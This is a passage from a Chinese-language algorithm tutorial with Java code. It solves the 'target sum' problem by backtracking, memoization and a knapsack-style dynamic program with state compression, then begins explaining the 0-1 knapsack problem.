<code>target</code> 不就行了嘛？</p><p>伪码思路如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> i)</span>:</span><br><span class="hljs-function">    <span class="hljs-title">if</span><span class="hljs-params">(i == len(nums)</span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(result == target)&#123;<br>    result ++;<br>    &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 给 nums[i] 选择 - 号</span><br>    rest += nums[i];<br>    <span class="hljs-comment">// 穷举 nums[i + 1]</span><br>    backtrack(nums, i + <span class="hljs-number">1</span>, rest);<br>    <span class="hljs-comment">// 撤销选择</span><br>    rest -= nums[i]; <br><br>    <span class="hljs-comment">// 给 nums[i] 选择 + 号</span><br>    rest -= nums[i];<br>    <span class="hljs-comment">// 穷举 nums[i + 1]</span><br>    backtrack(nums, i + <span class="hljs-number">1</span>, rest);<br>    <span class="hljs-comment">// 撤销选择</span><br>    rest += nums[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>如果看过我们之前的几篇回溯算法文章，这个代码可以说是比较简单的了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* 主函数 */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findTargetSumWays</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (nums.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    backtrack(nums, <span class="hljs-number">0</span>, target);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">/* 回溯算法模板 */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> rest)</span> </span>&#123;<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">if</span> (i == nums.length) &#123;<br>        <span class="hljs-keyword">if</span> (rest == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// 说明恰好凑出 target</span><br>            result++;<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 给 nums[i] 选择 - 号</span><br>    rest += nums[i];<br>    <span class="hljs-comment">// 穷举 nums[i + 1]</span><br>    backtrack(nums, i + <span class="hljs-number">1</span>, rest);<br>    <span class="hljs-comment">// 撤销选择</span><br>    rest -= nums[i]; <br><br>    <span class="hljs-comment">// 给 nums[i] 选择 + 号</span><br>    rest -= nums[i];<br>    <span class="hljs-comment">// 穷举 nums[i + 1]</span><br>    backtrack(nums, i + <span class="hljs-number">1</span>, rest);<br>    <span class="hljs-comment">// 撤销选择</span><br>    rest += nums[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>有的读者可能问，选择 <code>-</code> 的时候，为什么是 <code>rest += nums[i]</code>，选择 <code>+</code> 的时候，为什么是 <code>rest -= nums[i]</code> 呢，是不是写反了？</p><p>不是的，「如何凑出 <code>target</code>」和「如何把 <code>target</code> 减到 0」其实是一样的。我们这里选择后者，因为前者必须给 <code>backtrack</code> 函数多加一个参数，我觉得不美观：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> sum, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">if</span> (i == nums.length) &#123;<br>        <span class="hljs-keyword">if</span> (sum == target) &#123;<br>            result++;<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>因此，如果我们给 <code>nums[i]</code> 选择 <code>+</code> 号，就要让 <code>rest - nums[i]</code>，反之亦然。</p><p>以上回溯算法可以解决这个问题，时间复杂度为 <code>O(2^N)</code>，<code>N</code> 为 <code>nums</code> 的大小。这个复杂度怎么算的？回忆前文 <a href="">学习数据结构和算法的框架思维</a>，发现这个回溯算法就是个二叉树的遍历问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> rest)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (i == nums.length) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    backtrack(nums, i + <span class="hljs-number">1</span>, rest - nums[i]);<br>    backtrack(nums, i + <span class="hljs-number">1</span>, rest + nums[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>树的高度就是 <code>nums</code> 的长度嘛，所以说时间复杂度就是这棵二叉树的节点数，为 <code>O(2^N)</code>，其实是非常低效的。</p><p>那么，这个问题如何用动态规划思想进行优化呢？</p><h2 id="4-2-消除重叠子问题"><a href="#4-2-消除重叠子问题" class="headerlink" title="4.2 消除重叠子问题"></a>4.2 消除重叠子问题</h2><p>动态规划之所以比暴力算法快，是因为动态规划技巧消除了重叠子问题。</p><p>如何发现重叠子问题？看是否可能出现重复的「状态」。对于递归函数来说，函数参数中会变的参数就是「状态」，对于 <code>backtrack</code> 函数来说，会变的参数为 <code>i</code> 和 <code>rest</code>。</p><p>前文 <a href="">动态规划之编辑距离</a> 说了一种一眼看出重叠子问题的方法，先抽象出递归框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> rest)</span> </span>&#123;<br>    backtrack(i + <span class="hljs-number">1</span>, rest - nums[i]);<br>    backtrack(i + <span class="hljs-number">1</span>, rest + nums[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>举个简单的例子，如果 <code>nums[i] = 0</code>，会发生什么？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> rest)</span> </span>&#123;<br>    backtrack(i + <span class="hljs-number">1</span>, rest);<br>    backtrack(i + <span class="hljs-number">1</span>, rest);<br>&#125;<br></code></pre></td></tr></table></figure><p>你看，这样就出现了两个「状态」完全相同的递归函数，无疑这样的递归计算就是重复的。<strong>这就是重叠子问题，而且只要我们能够找到一个重叠子问题，那一定还存在很多的重叠子问题</strong>。</p><p>因此，状态 <code>(i, rest)</code> 是可以用备忘录技巧进行优化的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findTargetSumWays</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (nums.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> dp(nums, <span class="hljs-number">0</span>, target);<br>&#125;<br><br><span class="hljs-comment">// 备忘录</span><br>HashMap&lt;String, Integer&gt; memo = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> rest)</span> </span>&#123;<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">if</span> (i == nums.length) &#123;<br>        <span class="hljs-keyword">if</span> (rest == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 把它俩转成字符串才能作为哈希表的键</span><br>    String key = i + <span class="hljs-string">&quot;,&quot;</span> + rest;<br>    <span class="hljs-comment">// 避免重复计算</span><br>    <span class="hljs-keyword">if</span> (memo.containsKey(key)) &#123;<br>        <span class="hljs-keyword">return</span> memo.get(key);<br>    &#125;<br>    <span class="hljs-comment">// 还是穷举</span><br>    <span class="hljs-keyword">int</span> result = dp(nums, i + <span class="hljs-number">1</span>, rest - nums[i]) + dp(nums, i + <span class="hljs-number">1</span>, rest + nums[i]);<br>    <span class="hljs-comment">// 记入备忘录</span><br>    memo.put(key, result);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>以前我们都是用 Python 的元组配合哈希表 <code>dict</code> 来做备忘录的，其他语言没有元组，可以用把「状态」转化为字符串作为哈希表的键，这是一个常用的小技巧。</p><p>这个解法通过备忘录消除了很多重叠子问题，效率有一定的提升，但是这就结束了吗？</p><h2 id="4-3-动态规划"><a href="#4-3-动态规划" class="headerlink" title="4.3 动态规划"></a>4.3 动态规划</h2><p>其实，这个问题可以转化为一个子集划分问题，而子集划分问题又是一个典型的背包问题。动态规划总是这么玄学，让人摸不着头脑……</p><p>首先，如果我们把 <code>nums</code> 划分成两个子集 <code>A</code> 和 <code>B</code>，分别代表分配 <code>+</code> 的数和分配 <code>-</code> 的数，那么他们和 <code>target</code> 存在如下关系：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">sum(A) - sum(B) = target<br>sum(A) = target + sum(B)<br>sum(A) + sum(A) = target + sum(B) + sum(A)<br><span class="hljs-number">2</span> * sum(A) = target + sum(nums)<br></code></pre></td></tr></table></figure><p>综上，可以推出 <code>sum(A) = (target + sum(nums)) / 2</code>，也就是把原问题转化成：<strong><code>nums</code></strong> <strong>中存在几个子集</strong> <strong><code>A</code></strong>，使得<strong><code>A</code></strong> 中元素的和为 <code>(target + sum(nums)) / 2</code>？</p><p>类似的子集划分问题我们前文 <a href="">经典背包问题：子集划分</a> 讲过，现在实现这么一个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* 计算 nums 中有几个子集的和为 sum */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">subsets</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> sum)</span> </span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>然后，可以这样调用这个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findTargetSumWays</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> n : nums) sum += n;<br>    <span class="hljs-comment">// 这两种情况，不可能存在合法的子集划分</span><br>    <span class="hljs-keyword">if</span> (sum &lt; target || (sum + target) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> subsets(nums, (sum + target) / <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>好的，变成背包问题的标准形式：</p><p><strong>有一个背包，容量为</strong> <strong><code>sum</code></strong>，现在给你 <strong><code>N</code></strong> <strong>个物品，第</strong> <strong><code>i</code></strong> <strong>个物品的重量为</strong> <strong><code>nums[i - 1]</code></strong>（注意 <strong><code>1 &lt;= i &lt;= N</code></strong>），每个物品只有一个，请问你有几种不同的方法能够恰好装满这个背包？</p><p>现在，这就是一个正宗的动态规划问题了，下面按照我们一直强调的动态规划套路走流程：</p><p><strong>第一步要明确两点，「状态」和「选择」</strong>。</p><p>对于背包问题，这个都是一样的，状态就是「背包的容量」和「可选择的物品」，选择就是「装进背包」或者「不装进背包」。</p><p><strong>第二步要明确</strong> <strong><code>dp</code></strong> <strong>数组的定义</strong>。</p><p>按照背包问题的套路，可以给出如下定义：</p><p><code>dp[i][j] = x</code> 表示，若只在前 <code>i</code> 个物品中选择，若当前背包的容量为 <code>j</code>，则最多有 <code>x</code> 种方法可以恰好装满背包。</p><p>翻译成我们探讨的子集问题就是，若只在 <code>nums</code> 的前 <code>i</code> 个元素中选择，若目标和为 <code>j</code>，则最多有 <code>x</code> 种方法划分子集。</p><p>根据这个定义，显然 <code>dp[0][..] = 0</code>，因为没有物品的话，根本没办法装背包；<code>dp[..][0] = 1</code>，因为如果背包的最大载重为 0，「什么都不装」就是唯一的一种装法。</p><p>我们所求的答案就是 <code>dp[N][sum]</code>，即使用所有 <code>N</code> 个物品，有几种方法可以装满容量为 <code>sum</code> 的背包。</p><p><strong>第三步，根据「选择」，思考状态转移的逻辑</strong>。</p><p>回想刚才的 <code>dp</code> 数组含义，可以根据「选择」对 <code>dp[i][j]</code> 得到以下状态转移：</p><p>如果不把 <code>nums[i]</code> 算入子集，<strong>或者说你不把这第</strong> <strong><code>i</code></strong> <strong>个物品装入背包</strong>，那么恰好装满背包的方法数就取决于上一个状态 <code>dp[i-1][j]</code>，继承之前的结果。</p><p>如果把 <code>nums[i]</code> 算入子集，<strong>或者说你把这第</strong> <strong><code>i</code></strong> <strong>个物品装入了背包</strong>，那么只要看前 <code>i - 1</code> 个物品有几种方法可以装满 <code>j - nums[i-1]</code> 的重量就行了，所以取决于状态 <code>dp[i-1][j-nums[i-1]]</code>。</p><p>PS：注意我们说的 <code>i</code> 是从 1 开始算的，而数组 <code>nums</code> 的索引时从 0 开始算的，所以 <code>nums[i-1]</code> 代表的是第 <code>i</code> 个物品的重量，<code>j - nums[i-1]</code> 就是背包装入物品 <code>i</code> 之后还剩下的容量。</p><p><strong>由于</strong> <strong><code>dp[i][j]</code></strong> <strong>为装满背包的总方法数，所以应该以上两种选择的结果求和，得到状态转移方程</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">dp[i][j] = dp[i-<span class="hljs-number">1</span>][j] + dp[i-<span class="hljs-number">1</span>][j-nums[i-<span class="hljs-number">1</span>]];<br></code></pre></td></tr></table></figure><p>然后，根据状态转移方程写出动态规划算法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* 计算 nums 中有几个子集的和为 sum */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">subsets</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> sum)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>][sum + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= n; i++) &#123;<br>        dp[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= sum; j++) &#123;<br>            <span class="hljs-keyword">if</span> (j &gt;= nums[i-<span class="hljs-number">1</span>]) &#123;<br>                <span class="hljs-comment">// 两种选择的结果之和</span><br>                dp[i][j] = dp[i-<span class="hljs-number">1</span>][j] + dp[i-<span class="hljs-number">1</span>][j-nums[i-<span class="hljs-number">1</span>]];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 背包的空间不足，只能选择不装物品 i</span><br>                dp[i][j] = dp[i-<span class="hljs-number">1</span>][j];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n][sum];<br>&#125;<br></code></pre></td></tr></table></figure><p>然后，发现这个 <code>dp[i][j]</code> 只和前一行 <code>dp[i-1][..]</code> 有关，那么肯定可以优化成一维 <code>dp</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* 计算 nums 中有几个子集的和为 sum */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">subsets</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> sum)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[sum + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// base case</span><br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-comment">// j 要从后往前遍历</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = sum; j &gt;= <span class="hljs-number">0</span>; j--) &#123;<br>            <span class="hljs-comment">// 状态转移方程</span><br>            <span class="hljs-keyword">if</span> (j &gt;= nums[i-<span class="hljs-number">1</span>]) &#123;<br>                dp[j] = dp[j] + dp[j-nums[i-<span class="hljs-number">1</span>]];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                dp[j] = dp[j];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[sum];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>对照二维</strong> <strong><code>dp</code></strong>，只要把 <strong><code>dp</code></strong> <strong>数组的第一个维度全都去掉就行了，唯一的区别就是这里的</strong> <strong><code>j</code></strong> <strong>要从后往前遍历，原因如下</strong>：</p><p>因为二维压缩到一维的根本原理是，<code>dp[j]</code> 和 <code>dp[j-nums[i-1]]</code> 还没被新结果覆盖的时候，相当于二维 <code>dp</code> 中的 <code>dp[i-1][j]</code> 和 <code>dp[i-1][j-nums[i-1]]</code>。</p><p>那么，我们就要做到：<strong>在计算新的</strong> <strong><code>dp[j]</code></strong> <strong>的时候，</strong><code>dp[j]</code> <strong>和</strong> <strong><code>dp[j-nums[i-1]]</code></strong> <strong>还是上一轮外层 for 循环的结果</strong>。</p><p>如果你从前往后遍历一维 <code>dp</code> 数组，<code>dp[j]</code> 显然是没问题的，但是 <code>dp[j-nums[i-1]]</code> 已经不是上一轮外层 for 循环的结果了，这里就会使用错误的状态，当然得不到正确的答案。</p><p>现在，这道题算是彻底解决了。</p><p>总结一下，回溯算法虽好，但是复杂度高，即便消除一些冗余计算，也只是「剪枝」，没有本质的改进。而动态规划就比较玄学了，经过各种改造，从一个加减法问题变成子集问题，又变成背包问题，经过各种套路写出解法，又搞出状态压缩，还得反向遍历。</p><p>现在我都搞不清楚自己是来干嘛的了。嗯，这也许就是动态规划的魅力吧。</p><h1 id="5-背包问题"><a href="#5-背包问题" class="headerlink" title="5. 背包问题"></a>5. 背包问题</h1><h2 id="5-1-0-1-背包问题"><a href="#5-1-0-1-背包问题" class="headerlink" title="5.1 0-1 背包问题"></a>5.1 0-1 背包问题</h2><p>运筹学的0-1规划</p><p> 0-1 背包问题：给你一个可装载重量为W的背包和N个物品，每个物品有重量和价值两个属性。其中第i个物品的重量为wt[i]，价值为val[i]，现在让你用这个背包装物品，最多能装的价值是多少？</p><p>举个简单的例子，输入如下：</p><p>N = 3, W = 4</p><p>wt = [2, 1, 3]</p><p>val = [4, 2, 3]</p><p>算法返回 6，选择前两件物品装进背包，总重量 3 小于W，可以获得最大价值 6。</p><p>题目就是这么简单，一个典型的动态规划问题。<strong>这个题目中的物品不可以分割，要么装进包里，要么不装，不能说切成两块装一半。</strong>这也许就是 0-1 背包这个名词的来历。</p><p>解决这个问题没有什么排序之类巧妙的方法，只能穷举所有可能，根据我们 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484731&amp;idx=1&amp;sn=f1db6dee2c8e70c42240aead9fd224e6&amp;chksm=9bd7fb33aca07225bee0b23a911c30295e0b90f393af75eca377caa4598ffb203549e1768336&amp;scene=21#wechat_redirect">动态规划套路详解</a> 中的套路，直接走流程就行了。</p><p><strong>动规标准套路</strong></p><p>看来我得每篇动态规划文章都得重复一遍套路，历史文章中的动态规划问题都是按照下面的套路来的，今天再来手把手演示一下：</p><p><strong>第一步</strong>要明确两点，「状态」和「选择」。</p><p>先说状态，如何才能描述一个问题局面？只要给定几个可选物品和一个背包的容量限制，就形成了一个背包问题，对不对？<strong>所以状态有两个，就是「背包的容量」和「可选择的物品」</strong>。</p><p>再说选择，也很容易想到啊，对于每件物品，你能选择什么？<strong>选择就是「装进背包」或者「不装进背包」嘛</strong>。</p><p>明白了状态和选择，动态规划问题基本上就解决了，只要往这个框架套就完事儿了：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> 状态<span class="hljs-number">1</span> in 状态<span class="hljs-number">1</span>的所有取值：<br>  <span class="hljs-attribute">for</span> 状态<span class="hljs-number">2</span> in 状态<span class="hljs-number">2</span>的所有取值：<br><span class="hljs-attribute">for</span> ...<br><span class="hljs-attribute">dp</span>[状态<span class="hljs-number">1</span>][状态<span class="hljs-number">2</span>][...] = 择优(选择<span class="hljs-number">1</span>，选择<span class="hljs-number">2</span>...)<br></code></pre></td></tr></table></figure><p>PS：此框架出自历史文章 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484508&amp;idx=1&amp;sn=42cae6e7c5ccab1f156a83ea65b00b78&amp;chksm=9bd7fa54aca07342d12ae149dac3dfa76dc42bcdd55df2c71e78f92dedbbcbdb36dec56ac13b&amp;scene=21#wechat_redirect">团灭 LeetCode 股票买卖问题</a>。</p><p><strong>第二步</strong>要明确dp数组的定义。</p><p>dp数组是什么？其实就是描述问题局面的一个数组。换句话说，我们刚才明确问题有什么「状态」，现在需要用dp数组把状态表示出来。</p><p>首先看看刚才找到的「状态」，有两个，也就是说我们需要一个二维dp数组，一维表示可选择的物品，一维表示背包的容量。</p><p><strong>$dp[i][w]$</strong>的定义如下：对于前i个物品，当前背包的容量为w，这种情况下可以装的最大价值是$dp[i][w]$。</p><p>比如说，如果 $dp[3][5]$ = 6，其含义为：对于给定的一系列物品中，若只对前 3 个物品进行选择，当背包容量为 5 时，最多可以装下的价值为 6。</p><p>PS：为什么要这么定义？便于状态转移，或者说这就是套路，记下来就行了。建议看一下我们的动态规划系列文章，几种动规套路都被扒得清清楚楚了。</p><p>根据这个定义，我们想求的最终答案就是$dp[N][W]$。base case 就是$dp[0][..] = dp[..][0] = 0$，因为没有物品或者背包没有空间的时候，能装的最大价值就是 0。</p><p>细化上面的框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> dp[N+<span class="hljs-number">1</span>][W+<span class="hljs-number">1</span>]<br>dp[<span class="hljs-number">0</span>][..] = <span class="hljs-number">0</span><br>dp[..][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i in [<span class="hljs-number">1.</span>.N]:<br>  <span class="hljs-keyword">for</span> w in [<span class="hljs-number">1.</span>.W]:<br>    dp[i][w] = max(<br>      把物品 i 装进背包,<br>      不把物品 i 装进背包<br>    )<br><br><span class="hljs-keyword">return</span> dp[N][W]<br></code></pre></td></tr></table></figure><p><strong>第三步</strong>，根据「选择」，思考状态转移的逻辑。</p><p>简单说就是，上面伪码中「把物品i装进背包」和「不把物品i装进背包」怎么用代码体现出来呢？</p><p><strong>这一步要结合对</strong>dp数组的定义和我们的算法逻辑来分析：</p><p>先重申一下刚才我们的dp数组的定义：</p><p>$dp[i][w]$表示：对于前i个物品，当前背包的容量为w时，这种情况下可以装下的最大价值是$dp[i][w]$。</p><p><strong>如果你没有把这第</strong>i个物品装入背包，那么很显然，最大价值$dp[i][w]$应该等于$dp[i-1][w]$。你不装嘛，那就继承之前的结果。</p><p><strong>如果你把这第</strong>i个物品装入了背包，那么$dp[i][w]$应该等于$dp[i-1][w-wt[i-1]] + val[i-1]$。</p><p>首先，由于i是从 1 